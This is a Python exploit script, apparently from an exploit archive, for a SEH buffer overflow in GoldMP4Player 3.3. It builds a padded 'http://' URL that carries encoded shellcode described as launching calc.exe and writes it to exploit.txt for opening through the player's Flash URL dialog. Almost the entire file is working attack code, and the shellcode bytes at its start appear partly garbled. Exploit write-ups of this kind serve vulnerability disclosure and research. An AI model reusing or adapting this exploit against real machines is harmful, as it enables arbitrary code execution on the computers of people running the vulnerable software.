#!/usr/bin/python
# coding: utf-8
#Exploit Title: GoldMP4Player Buffer Overflow (SEH)  
#Software Link: http://download.cnet.com/GoldMP4Player/3000-2139_4-10967424.html 
#Version: 3.3 
#Date: 27.02.2014                                                                 
#Tested on: Windows Win 7 En
# Howto / Notes:
#open the URL in filename via File -> Open Flash URL\n";
#-------------------------------------------------------
'''Credits:
Vulnerability POC identified in v3.3 by Gabor Seljan
http://www.exploit-db.com/exploits/31914/'''
#------------------------------------------------------
head="http://"
buff="\x41" * 253
#shell calc.exe
buff+=("����������q�ZJJJJJJJJJJJCCCCCC7RYjAXP0A0AkAAQ2AB2BB0BBABXP8"
"ABuJIylHhlIePePGpapMYJEFQiBBDlKpRVPnk3btLNkv24TlKrRDhdOMgBj7Vtq9oTq9PllUlpac"
"LdBFLa09QHO4M31kwjBL01BpWLKpRvpNk3rElFaZpnk1PBXou9PQdPJvajpbplKrhR8NkpXa0wqI"
"CIsgLqYlKp4nkgqKfEakOVQIPllzaHOtMuQxGGHYpsEJTVcSMYh5kqm141ehbchNkshtdWqYC0fLK"
"fl2klKrx5LWqxSlKgtlKuQxPmYstEtEtsksku10YcjpQkOypf8QOpZLKeBhkk6QMSZ31nmouMiGpEP"
"s0f02HdqlKpoLGkOjuOKjPOEI2QFCXi6NuoMomkOju5ls6SL6jOpkKYpsE4EOKBgdSd20orJWppSio"
"IERCParLbCDnbEsH0e30AA")
head2=".swf"

exploit=head + buff + head2
try:
    out_file = open("exploit.txt",'w')
    out_file.write(exploit)
    out_file.close()
except:
    print "Error"